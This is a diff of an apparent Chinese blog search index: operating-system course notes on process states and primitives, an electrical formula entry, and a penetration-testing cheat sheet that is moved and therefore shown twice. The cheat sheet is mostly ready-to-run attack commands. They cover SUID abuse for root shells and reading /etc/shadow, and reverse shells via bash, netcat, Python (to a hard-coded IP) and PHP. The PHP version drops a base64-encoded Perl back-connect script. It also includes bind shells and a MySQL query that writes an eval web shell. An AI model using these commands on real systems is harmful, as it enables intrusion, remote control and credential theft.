-<p>知道进程的祖先进程有助于当子进程被杀死后通知父进程</p>
-<h3 id="pcb的组织方式">PCB的组织方式</h3>
-<p>执行指针</p>
-<p>就绪队列指针</p>
-<p>阻塞队列指针</p>
-<p>空闲队列指针</p>
-<ul>
-<li>链接方式
-<ul>
-<li>通过链表查询队列</li>
-</ul></li>
-<li>索引方式
-<ul>
-<li>建立索引表用于查询队列</li>
-</ul></li>
-</ul>
-<h2 id="进程的创建与终止">进程的创建与终止</h2>
-<h3 id="引起创建进程的事件">引起创建进程的事件</h3>
-<ul>
-<li>用户登录
-<ul>
-<li>分时系统中，验证为合法的终端用户登录</li>
-</ul></li>
-<li>作业调度
-<ul>
-<li>批处理系统中作业调度到某作业</li>
-</ul></li>
-<li>提供服务
-<ul>
-<li>运行中的用户程序提出某种请求</li>
-</ul></li>
-<li>应用请求
-<ul>
-<li>基于用户进程的需要由其自身创建新进程</li>
-</ul></li>
-</ul>
-<h3 id="引起终止进程的事件">引起终止进程的事件</h3>
-<ul>
-<li>正常结束
-<ul>
-<li>批处理系统中的Halt，分时系统中的LogsOff</li>
-</ul></li>
-<li>异常结束
-<ul>
-<li>越界错误、保护错误</li>
-<li>特权指令错误</li>
-<li>非法指令错误</li>
-<li>运行超时、等待超时</li>
-<li>算数运算错、I/O故障</li>
-</ul></li>
-<li>外界干预
-<ul>
-<li>操作员或者操作系统干预
-<ul>
-<li>发送SIGKILL信号强制杀死</li>
-</ul></li>
-<li>父进程请求/终止</li>
-</ul></li>
-</ul>
-<h3 id="进程创建过程">进程创建过程</h3>
-<h4 id="create原语">Create()原语</h4>
-<ol type="1">
-<li>分配标识符，并申请空白进程控制块</li>
-<li>为新进程的程序和数据及用户占分配必要的内存空间
-<ol type="1">
-<li>所需内存大小问题</li>
-</ol></li>
-<li>初始化进程控制快
-<ol type="1">
-<li>自身/父进程标识符</li>
-<li>处理机状态/调度信息</li>
-</ol></li>
-<li>讲新进程插入到就绪队列</li>
-</ol>
-<h3 id="进程终止过程">进程终止过程</h3>
-<h4 id="terminate原语">Terminate()原语</h4>
-<ol type="1">
-<li>检索被终止进程PCB，读取其进程状态</li>
-<li>若其正处于执行状态，立即终止执行并设置调度标志为真，来重新调度其他进程</li>
-<li>终止子孙进程</li>
-<li><strong>资源归还</strong>-最重要的过程</li>
-<li>一处被终止进程PCB，等待其他程序查询利用</li>
-</ol>
-<h2 id="进程的阻塞与唤醒">进程的阻塞与唤醒</h2>
-<h3 id="引起进程阻塞的事件">引起进程阻塞的事件</h3>
-<ul>
-<li>请求系统服务
-<ul>
-<li>但不能立刻满足，需要阻塞自己等待系统服务的响应</li>
-</ul></li>
-<li>启动某种操作
-<ul>
-<li>某种动作是本进程下一个动作的前趋，不满足不能向后执行</li>
-</ul></li>
-<li>新数据尚未到达
-<ul>
-<li>相互合作的进程必须先获得另一方的进程数据才能继续</li>
-</ul></li>
-<li>无新工作可做
-<ul>
-<li>特定功能的系统进程当完成任务且当前暂无任务</li>
-</ul></li>
-</ul>
-<h3 id="引起进程唤醒的事件">引起进程唤醒的事件</h3>
-<ul>
-<li>系统服务满足</li>
-<li>操作完成</li>
-<li>数据到达</li>
-<li>新任务出现</li>
-</ul>
-<h3 id="进程阻塞过程">进程阻塞过程</h3>
-<h4 id="block原语">Block()原语</h4>
-<ol type="1">
-<li>先立即停止执行，把进程控制块中的现行状态由执行状态改为阻塞状态，并将它插入到对应的阻塞队列中</li>
-<li>转调度程序进程重新调度，将处理机分配给另一就绪进程，并进行切换</li>
-</ol>
-<h3 id="进程唤醒过程">进程唤醒过程</h3>
-<h4 id="wakeup原语">Wakeup()原语</h4>
-<p>首先把阻塞进程从等待该事件的阻塞进程队列中移出，将其PCB中的现行状态由阻塞改为就绪，并插入到就绪队列中</p>
-<h2 id="进程的挂起与激活">进程的挂起与激活</h2>
-<h3 id="进程挂起过程">进程挂起过程</h3>
-<h4 id="suspend过程">Suspend()过程</h4>
-<ol type="1">
-<li>检查被挂起进程的状态并修改和插入到对应队列</li>
-<li>复制PCB到指定域</li>
-<li>若被挂进程正在执行则转向调度程序重新调度</li>
-</ol>
-<h3 id="进程激活过程">进程激活过程</h3>
-<h4 id="activate原语">Activate()原语</h4>
-<ol type="1">
-<li>检查进程现行状态并修改和插队</li>
-<li>若有新进程进入就绪队列并采用了抢占式调度策略，则检查和决定是否重新调度</li>
-</ol>
 ]]></content>
       <categories>
         <category>大学</category>
@@ -4116,37 +4122,6 @@ P(A)=\frac{mA}{mS}
 ]]></content>
   </entry>
   <entry>
-    <title>渗透合集</title>
-    <url>/%E6%B8%97%E9%80%8F%E5%90%88%E9%9B%86/</url>
-    <content><![CDATA[<h3 id="提权相关">提权相关</h3>
-<p>查看系统上运行的所有SUID可执行文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">$ find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
-<p>以上所有二进制文件都将以root用户权限执行，因为它们的权限中包含"s"，并且对应的是root权限。</p>
-<p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ touch pentestlab</span><br><span class="line">$ find pentestlab -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure> 大部分Linux操作系统都安装了netcat，因此也可以被利用来将权限提升至root。 <span id="more"></span> <strong>在被攻击机执行</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find pentestlab -<span class="built_in">exec</span> netcat -lvp 被攻击机监听端口 -e /bin/sh \;</span><br></pre></td></tr></table></figure> 连接上去就会直接获取到一个Root权限的shell。</p>
-<p><strong>在攻击机执行</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netcat 被攻击机ip 被攻击机监听端口</span><br></pre></td></tr></table></figure> Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim.tiny /etc/shadow</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure> Less和More都执行以用来提权。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></p>
-<ol start="2" type="1">
-<li>反弹shell相关</li>
-</ol>
-<h4 id="反向连接">反向连接</h4>
-<ol type="1">
-<li><p>使用bash <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/[tcp|udp]/攻击机ip/攻击机端口号 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p></li>
-<li><p>使用nc <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc -e /bin/sh 攻击机ip 攻击机端口号</span><br><span class="line">$ nc -c /bin/sh 攻击机ip 攻击机端口号</span><br><span class="line"></span><br><span class="line">-c shell commands       as <span class="string">&#x27;-e&#x27;</span>; use /bin/sh to <span class="built_in">exec</span> [dangerous!!]</span><br><span class="line">-e filename             program to <span class="built_in">exec</span> after connect [dangerous!!]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">没有-e的情况:</span><br><span class="line">攻击机执行：</span><br><span class="line"></span><br><span class="line">$ nc -lnvp 攻击机监听端口号</span><br><span class="line"></span><br><span class="line">被攻击机执行：</span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">$ /bin/sh | nc 攻击机ip 攻击机监听端口号</span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">$ mknod /tmp/backpipe p</span><br><span class="line">或者</span><br><span class="line">$ mkfifo /tmp/backpipe</span><br><span class="line">$ /bin/sh 0&lt;/tmp/backpipe | nc 攻击机ip 攻击机监听端口号 1&gt;/tmp/backpipe</span><br><span class="line"></span><br><span class="line">mknod 管道名 p,mkfifo 管道名 </span><br><span class="line">都是创建管道的命令</span><br></pre></td></tr></table></figure></p></li>
-<li><p>使用python <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;172.28.85.115&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></p></li>
-<li><p>使用php 访问反弹 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$path</span> = execute(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(function_exists(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">			@exec(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line">			<span class="variable">$res</span> = join(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$res</span> = @shell_exec(<span class="variable">$cfe</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">			@ob_start();</span><br><span class="line">			@system(<span class="variable">$cfe</span>);</span><br><span class="line">			<span class="variable">$res</span> = @ob_get_contents();</span><br><span class="line">			@ob_end_clean();</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">			@ob_start();</span><br><span class="line">			@passthru(<span class="variable">$cfe</span>);</span><br><span class="line">			<span class="variable">$res</span> = @ob_get_contents();</span><br><span class="line">			@ob_end_clean();</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(@is_resource(<span class="variable">$f</span> = @popen(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">			<span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">while</span>(!@feof(<span class="variable">$f</span>)) &#123;</span><br><span class="line">				<span class="variable">$res</span> .= @fread(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			@pclose(<span class="variable">$f</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$fp</span>=@fopen(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">		@fputs(<span class="variable">$fp</span>,@base64_decode(<span class="variable">$text</span>));</span><br><span class="line">		@fclose(<span class="variable">$fp</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot; 攻击机ip&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&quot;攻击机监听端口号&quot;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line">cf(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = execute(which(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br></pre></td></tr></table></figure> 终端执行反弹 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机监听端口号&quot;)&#x27;</span></span><br><span class="line">$ php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机监听端口号);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure></p></li>
-</ol>
-<h4 id="正向连接">正向连接</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">被攻击机:</span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">$ rm -f /tmp/f; mkfifo /tmp/f</span><br><span class="line">$ cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/f</span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">$ nc -lvvp 被攻击机监听端口 -e /bin/bash</span><br><span class="line"></span><br><span class="line">攻击机:</span><br><span class="line"></span><br><span class="line">$ nc 被攻击机ip 被攻击机监听端口</span><br></pre></td></tr></table></figure>
-<h3 id="mysql">Mysql</h3>
-<h4 id="写出文件">写出文件</h4>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="string">&#x27;&lt;? php eval($_POST[密码]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;d:/wwwroot/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<h4 id="读取文件">读取文件</h4>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>linux渗透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>电力计算公式</title>
     <url>/%E7%94%B5%E5%8A%9B%E8%AE%A1%E7%AE%97%E5%85%AC%E5%BC%8F/</url>
     <content><![CDATA[<h3 id="电阻">电阻</h3>
@@ -4179,6 +4154,51 @@ U=\frac{p}{I}
       </categories>
   </entry>
   <entry>
+    <title>渗透合集</title>
+    <url>/%E6%B8%97%E9%80%8F%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[<h3 id="提权相关">提权相关</h3>
+<p>查看系统上运行的所有SUID可执行文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">$ find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<p>以上所有二进制文件都将以root用户权限执行，因为它们的权限中包含"s"，并且对应的是root权限。</p>
+<p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ touch pentestlab</span><br><span class="line">$ find pentestlab -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure> 大部分Linux操作系统都安装了netcat，因此也可以被利用来将权限提升至root。 <span id="more"></span> <strong>在被攻击机执行</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find pentestlab -<span class="built_in">exec</span> netcat -lvp 被攻击机监听端口 -e /bin/sh \;</span><br></pre></td></tr></table></figure> 连接上去就会直接获取到一个Root权限的shell。</p>
+<p><strong>在攻击机执行</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netcat 被攻击机ip 被攻击机监听端口</span><br></pre></td></tr></table></figure> Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim.tiny /etc/shadow</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure> Less和More都执行以用来提权。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></p>
+<ol start="2" type="1">
+<li>反弹shell相关</li>
+</ol>
+<h4 id="反向连接">反向连接</h4>
+<ol type="1">
+<li><p>使用bash <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/[tcp|udp]/攻击机ip/攻击机端口号 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p></li>
+<li><p>使用nc <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc -e /bin/sh 攻击机ip 攻击机端口号</span><br><span class="line">$ nc -c /bin/sh 攻击机ip 攻击机端口号</span><br><span class="line"></span><br><span class="line">-c shell commands       as <span class="string">&#x27;-e&#x27;</span>; use /bin/sh to <span class="built_in">exec</span> [dangerous!!]</span><br><span class="line">-e filename             program to <span class="built_in">exec</span> after connect [dangerous!!]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">没有-e的情况:</span><br><span class="line">攻击机执行：</span><br><span class="line"></span><br><span class="line">$ nc -lnvp 攻击机监听端口号</span><br><span class="line"></span><br><span class="line">被攻击机执行：</span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">$ /bin/sh | nc 攻击机ip 攻击机监听端口号</span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">$ mknod /tmp/backpipe p</span><br><span class="line">或者</span><br><span class="line">$ mkfifo /tmp/backpipe</span><br><span class="line">$ /bin/sh 0&lt;/tmp/backpipe | nc 攻击机ip 攻击机监听端口号 1&gt;/tmp/backpipe</span><br><span class="line"></span><br><span class="line">mknod 管道名 p,mkfifo 管道名 </span><br><span class="line">都是创建管道的命令</span><br></pre></td></tr></table></figure></p></li>
+<li><p>使用python <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;172.28.85.115&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></p></li>
+<li><p>使用php 访问反弹 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$path</span> = execute(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(function_exists(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">			@exec(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line">			<span class="variable">$res</span> = join(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$res</span> = @shell_exec(<span class="variable">$cfe</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">			@ob_start();</span><br><span class="line">			@system(<span class="variable">$cfe</span>);</span><br><span class="line">			<span class="variable">$res</span> = @ob_get_contents();</span><br><span class="line">			@ob_end_clean();</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">			@ob_start();</span><br><span class="line">			@passthru(<span class="variable">$cfe</span>);</span><br><span class="line">			<span class="variable">$res</span> = @ob_get_contents();</span><br><span class="line">			@ob_end_clean();</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(@is_resource(<span class="variable">$f</span> = @popen(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">			<span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">while</span>(!@feof(<span class="variable">$f</span>)) &#123;</span><br><span class="line">				<span class="variable">$res</span> .= @fread(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			@pclose(<span class="variable">$f</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$fp</span>=@fopen(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">		@fputs(<span class="variable">$fp</span>,@base64_decode(<span class="variable">$text</span>));</span><br><span class="line">		@fclose(<span class="variable">$fp</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot; 攻击机ip&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&quot;攻击机监听端口号&quot;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line">cf(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = execute(which(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br></pre></td></tr></table></figure> 终端执行反弹 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机监听端口号&quot;)&#x27;</span></span><br><span class="line">$ php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机监听端口号);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure></p></li>
+</ol>
+<h4 id="正向连接">正向连接</h4>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">被攻击机:</span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">$ rm -f /tmp/f; mkfifo /tmp/f</span><br><span class="line">$ cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/f</span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">$ nc -lvvp 被攻击机监听端口 -e /bin/bash</span><br><span class="line"></span><br><span class="line">攻击机:</span><br><span class="line"></span><br><span class="line">$ nc 被攻击机ip 被攻击机监听端口</span><br></pre></td></tr></table></figure>
+<h3 id="mysql">Mysql</h3>
+<h4 id="写出文件">写出文件</h4>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="string">&#x27;&lt;? php eval($_POST[密码]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;d:/wwwroot/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="读取文件">读取文件</h4>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>linux渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>电子电路符号</title>
+    <url>/%E7%94%B5%E5%AD%90%E7%94%B5%E8%B7%AF%E7%AC%A6%E5%8F%B7/</url>
+    <content><![CDATA[<h2 id="重要结论">重要结论:</h2>
+<h4 id="零值电阻从电气特性上来说是等效于零值电压源的.">零值电阻从电气特性上来说,是等效于零值电压源的.</h4>
+<h4 id="独立电压源的电流是由外电路决定的.">独立电压源的电流是由外电路决定的.</h4>
+<h4 id="开路或无穷值电阻从电气特性上等效为零值电流源.">开路或无穷值电阻从电气特性上等效为零值电流源.</h4>
+<p>2b法是指根据两个b(branch支路)求解出b个电流和b个电压</p>
